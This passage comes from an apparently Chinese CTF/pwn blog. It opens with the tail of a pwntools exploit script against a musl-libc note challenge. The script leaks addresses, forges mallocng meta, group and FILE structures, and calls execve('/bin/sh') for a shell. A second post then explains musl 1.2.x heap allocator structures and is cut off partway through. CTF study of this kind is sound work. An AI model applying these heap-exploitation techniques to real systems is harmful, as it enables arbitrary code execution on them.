class="comment">#gdb.attach(p,&quot;b *$rebase(0x137E)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,note</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;note size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(note)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;note content: &quot;</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forget</span>():</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="string">&quot;A&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">forget()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;E&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">&quot;F&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&quot;E&quot;</span>*<span class="number">0xc</span>)</span><br><span class="line">add(<span class="string">&quot;eqqie&quot;</span>,<span class="string">&quot;x&quot;</span>*<span class="number">0x38</span>)</span><br><span class="line">show(<span class="string">&quot;E&quot;</span>*<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x28:&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    leak_addr += <span class="built_in">int</span>(p.recv(<span class="number">2</span>).decode(), <span class="number">16</span>) &lt;&lt; (i*<span class="number">8</span>)</span><br><span class="line">pro_base = leak_addr - <span class="number">0x48b0</span></span><br><span class="line">heap_base = pro_base</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">read_got = pro_base + <span class="number">0x3fa8</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;A&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line">forget()</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;b&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;c&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&quot;B&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fake_note = p64(pro_base+<span class="number">0x4900</span>) + p64(read_got)</span><br><span class="line">fake_note += p64(<span class="number">4</span>) + p64(<span class="number">8</span>) </span><br><span class="line">fake_note += p64(<span class="number">0</span>) </span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0x4</span>, fake_note) </span><br><span class="line">show(<span class="string">&quot;b&quot;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x8:&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    leak_addr += <span class="built_in">int</span>(p.recv(<span class="number">2</span>).decode(), <span class="number">16</span>) &lt;&lt; (i*<span class="number">8</span>)</span><br><span class="line">libc_base = leak_addr - <span class="number">0x72740</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stdout_used = libc_base + <span class="number">0xad3b0</span></span><br><span class="line">success(<span class="string">&quot;stdout_used &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stdout_used))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="string">&quot;y&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;y&quot;</span>*<span class="number">0x4</span>) </span><br><span class="line">forget() </span><br><span class="line"></span><br><span class="line">heap_secret_ptr = libc_base + <span class="number">0xad9c0</span></span><br><span class="line">success(<span class="string">&quot;heap_secret_ptr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_secret_ptr))</span><br><span class="line"></span><br><span class="line">forget() </span><br><span class="line">add(<span class="string">&quot;A&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;b&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line">dele(<span class="string">&quot;A&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fake_note = p64(heap_base+<span class="number">0x48c0</span>) + p64(heap_secret_ptr) </span><br><span class="line">fake_note += p64(<span class="number">4</span>) + p64(<span class="number">8</span>) </span><br><span class="line">fake_note += p64(<span class="number">0</span>) </span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0x4</span>, fake_note) </span><br><span class="line">show(<span class="string">&quot;a&quot;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x8:&quot;</span>)</span><br><span class="line">heap_secret = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    heap_secret += <span class="built_in">int</span>(p.recv(<span class="number">2</span>).decode(), <span class="number">16</span>) &lt;&lt; (i*<span class="number">8</span>)</span><br><span class="line">success(<span class="string">&quot;heap_secret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_secret))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="string">&quot;y&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;y&quot;</span>*<span class="number">0x4</span>) </span><br><span class="line">forget() </span><br><span class="line"></span><br><span class="line">new_heap2 = libc_base - <span class="number">0x7000</span>  </span><br><span class="line">success(<span class="string">&quot;new_heap2 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(new_heap2))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;A&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x4</span>) </span><br><span class="line"></span><br><span class="line">execve = libc_base + <span class="number">0x4e0c0</span></span><br><span class="line">fake_area_addr = new_heap2 + <span class="number">0x1000</span></span><br><span class="line">fake_meta_ptr = fake_area_addr + <span class="number">0x20</span></span><br><span class="line">fake_group_ptr = fake_meta_ptr + <span class="number">0x30</span></span><br><span class="line">fake_iofile_ptr = fake_group_ptr + <span class="number">0x10</span></span><br><span class="line">fake_chunk_ptr = fake_iofile_ptr - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;execve &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(execve))</span><br><span class="line">success(<span class="string">&quot;fake_area_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_area_addr))</span><br><span class="line">success(<span class="string">&quot;fake_meta_ptr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_meta_ptr))</span><br><span class="line">success(<span class="string">&quot;fake_group_ptr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_group_ptr))</span><br><span class="line">success(<span class="string">&quot;fake_iofile_ptr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_iofile_ptr))</span><br><span class="line"></span><br><span class="line">fake_area  =  <span class="string">&quot;&quot;</span></span><br><span class="line">fake_area += p64(heap_secret) + <span class="string">&quot;M&quot;</span> * <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">fake_group  = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_group += p64(fake_meta_ptr)    </span><br><span class="line"></span><br><span class="line">fake_iofile  = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_iofile += p64(<span class="number">0</span>) </span><br><span class="line">fake_iofile += <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&#x27;X&#x27;</span> * <span class="number">32</span> + p64(<span class="number">0xdeadbeef</span>) + <span class="string">&#x27;X&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xbeefdead</span>) + p64(execve) + p64(execve)</span><br><span class="line">fake_iofile  = fake_iofile.ljust(<span class="number">0x500</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_meta  = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_meta += p64(fake_iofile_ptr) + p64(stdout_used) </span><br><span class="line">fake_meta += p64(fake_group_ptr)</span><br><span class="line">fake_meta += p64((<span class="number">1</span> &lt;&lt; <span class="number">1</span>)) + p64((<span class="number">20</span> &lt;&lt; <span class="number">6</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) | <span class="number">1</span> | (<span class="number">0xfff</span> &lt;&lt; <span class="number">12</span>))</span><br><span class="line">fake_meta  = fake_meta.ljust(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;z&quot;</span>*(<span class="number">0x1000</span>-<span class="number">0x20</span>)</span><br><span class="line">payload += fake_area + fake_meta + fake_group + fake_iofile</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;B&quot;</span>*<span class="number">0x4</span>, payload) </span><br><span class="line">dele(<span class="string">&quot;A&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fake_note = p64(heap_base+<span class="number">0x4960</span>) + p64(fake_iofile_ptr) </span><br><span class="line">fake_note += p64(<span class="number">4</span>) + p64(<span class="number">4</span>) </span><br><span class="line">fake_note += p64(<span class="number">0</span>) </span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0x4</span>, fake_note) </span><br><span class="line">add(<span class="string">&quot;D&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;d&quot;</span>*<span class="number">4</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="string">&quot;y&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>musl pwn 初探，基本上就是调别人的 exp，下次争取自己打</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/08/musl%201.2.x%20%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%88%9D%E6%8E%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/08/musl%201.2.x%20%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">musl 1.2.x 堆分配器初探</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-08 20:29:38" itemprop="dateCreated datePublished" datetime="2023-03-08T20:29:38+08:00">2023-03-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-09 23:56:09" itemprop="dateModified" datetime="2023-03-09T23:56:09+08:00">2023-03-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Libc-Musl-简析"><a href="#Libc-Musl-简析" class="headerlink" title="Libc Musl 简析"></a>Libc Musl 简析</h2><p>Musl 是一个轻量级的C标准库，设计作为 GNU C library (glibc)、 uClibc 或 Android Bionic 的替代用于嵌入式操作系统和移动设备</p>
<p>它遵循 POSIX 2008 规格和 C99 标准，采用 MIT 许可证授权，使用 Musl 的 Linux 发行版和项目包括 <code>sabotage</code>， <code>bootstrap-linux</code>， <code>LightCube OS</code> 等</p>
<h2 id="Libc-Musl-堆管理器-1-2-x"><a href="#Libc-Musl-堆管理器-1-2-x" class="headerlink" title="Libc Musl 堆管理器 - 1.2.x"></a>Libc Musl 堆管理器 - 1.2.x</h2><p>1.2.x 和 1.1.x 堆管理结构几乎完全不同：</p>
<img src="/2023/03/08/musl%201.2.x%20%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%88%9D%E6%8E%A2/1678206958466-1678377368636.png" class width="1678206958466">  
<ul>
<li>1.2.x 新版本使用 mallocng</li>
<li>1.1.x 旧版本使用 oidmalloc</li>
</ul>
<p><strong>1.2.x Musl 关键结构体</strong></p>
<p>在 Musl 中有几大重要的结构体：</p>
<p>malloc_context：musl libc 的全局管理结构指针，存放在 <code>libc.so</code> 的 <code>.bss</code> 段 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> secret; <span class="comment">/* 在每页的开头,用于校验/检查meta_area-&gt;check */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">	<span class="keyword">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> init_done; <span class="comment">/* 用于判断该结构体是否进行了初始化 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> mmap_counter; <span class="comment">/* mmap计数器 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span> <span class="comment">/* 释放堆内存管理器 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span> <span class="comment">/* 可用的的堆内存管理器 */</span></span><br><span class="line">	<span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span> <span class="comment">/* 头指针和尾指针 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span> <span class="comment">/* 可以用来分配的meta */</span></span><br><span class="line">	<span class="keyword">size_t</span> usage_by_class[<span class="number">48</span>]; <span class="comment">/* 对应大小的group所管理的chunk个数 */</span></span><br><span class="line">	<span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">	<span class="keyword">uint8_t</span> seq;</span><br><span class="line">	<span class="keyword">uintptr_t</span> brk; <span class="comment">/* 使用brk开拓的heap的最高地址 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>数组 <code>active</code> 中的每个条目都是一个 meta 链表，其含义为 “有可用 chunk 的 meta 链表”（当一个 meta 被填满时，它将不会出现在 <code>active</code> 中）</li>
<li>musl 把 chunk 大小分为48类，用 size_to_class 进行计算（与 <code>*active[48]</code> 对应）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">	<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">	<span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">	<span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">	<span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">	<span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">	<span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">	<span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">	<span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">	<span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">	<span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">	<span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>meta_area：mallocng 在分配 meta 时，总是先分配一页的内存，然后划分为多个 meta 区域，而该页的最开始存放的就是 meta_area</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> check; <span class="comment">/* 用于和malloc_context-&gt;secret进行匹配 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span> <span class="comment">/* 下一个节点指针 */</span></span><br><span class="line">	<span class="keyword">int</span> nslots; <span class="comment">/* 当前使用的meta数量 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span> <span class="comment">/* 指向meta的指针(结构体meta_area后面的内存就是meta数组) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>slots 结构体数组可以看作是一个 meta 的集合</li>
</ul>
<p>meta：组成一个 meta 队列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span> <span class="comment">/* 双向链表 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span> <span class="comment">/* 指向group */</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask; <span class="comment">/* 可用/释放chunk的bitmap */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>; <span class="comment">/* 表示最后一个chunk的下标 */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>; <span class="comment">/* group的大小,如果mem是mmap分配,固定为63 */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>; <span class="comment">/* 如果group是mmap分配的,则代表内存页数,否则为&#x27;0&#x27; */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>meta 可以是 brk 分配的，可以是 mmap 映射的</li>
</ul>
<p>group：由多个相同大小的 chunk 以及一些控制信息组成的（并且物理相邻）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span> <span class="comment">/* 指回meta */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>]; <span class="comment">/* 0x10字节对齐(NUIT为0x10) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>group 只能是 mmap 映射的</li>
<li>这里的 storage 就是我们习惯中理解的 chunk</li>
</ul>
<p>chunk 没有专门在代码中定义，但总体结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> prev_user_data[]; <span class="comment">/* 用于存储上一个chunk的数据 */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> idx; <span class="comment">/* 低5bit作为idx表示这是group中第几个chunk,高3bit作为预留位 */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">/* 与第一个chunk的偏移 */</span></span><br><span class="line">    <span class="keyword">char</span> user_data[]; <span class="comment">/* 用于存储数据 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>group 中第一个 chunk 的 pre_user_data 为一个指针，指向这个 group 的 meta 元数据（其实就是 <code>group-&gt;meta</code> 指针）</li>
<li>其余 chunk 使用 offset 表示与所属 group 中第一个 chunk 的偏移，而 pre_user_data 用于存储上一个 chunk 的数据</li>
</ul>
<p>这些结构体的关系如下图：</p>
<img src="/2023/03/08/musl%201.2.x%20%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%88%9D%E6%8E%A2/1678274126255-1678377368637.png" class width="1678274126255"> 
<ul>
<li>相同类型的 meta 之间通过双向链表进行连接，头节点地址存储于 <code>malloc_context-&gt;active</code> 中</li>
<li>而 meta_area 会形成一条单向链表，其头节点和尾节点指针都存储于 <code>malloc_context</code> 中</li>
</ul>
<p><strong>1.2.x Musl 关键函数</strong></p>
<p>malloc：核心分配函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span 